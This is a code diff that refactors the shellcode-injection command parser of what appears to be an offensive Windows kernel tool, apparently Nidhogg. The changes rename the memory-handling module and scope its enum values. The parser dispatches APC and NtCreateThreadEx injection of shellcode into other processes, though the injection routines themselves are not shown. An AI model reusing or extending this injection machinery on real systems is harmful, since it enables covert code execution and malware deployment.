@@ -1,6 +1,6 @@
 #include "pch.h"
 #include "ShellcodeInjectionParser.h"
-#include "MemoryUtils.h"
+#include "MemoryHandler.h"
 #include "ProcessHandler.h"
 
 ShellcodeInjectionParser::ShellcodeInjectionParser() {
@@ -73,26 +73,26 @@ NTSTATUS ShellcodeInjectionParser::Execute(Options commandId, PVOID args[MAX_ARG
 	switch (commandId) {
 	case Options::APC:
 	{
-		shellcodeInfo.Type = APCInjection;
+		shellcodeInfo.Type = InjectionType::APCInjection;
 
 		if (!Features.ApcInjection) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
 
-		status = NidhoggMemoryUtils->InjectShellcodeAPC(&shellcodeInfo);
+		status = NidhoggMemoryHandler->InjectShellcodeAPC(&shellcodeInfo);
 		break;
 	}
 	case Options::Thread:
 	{
-		shellcodeInfo.Type = NtCreateThreadExInjection;
+		shellcodeInfo.Type = InjectionType::NtCreateThreadExInjection;
 
 		if (!Features.CreateThreadInjection) {
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
 
-		status = NidhoggMemoryUtils->InjectShellcodeThread(&shellcodeInfo);
+		status = NidhoggMemoryHandler->InjectShellcodeThread(&shellcodeInfo);
 		break;
 	}
 	default:
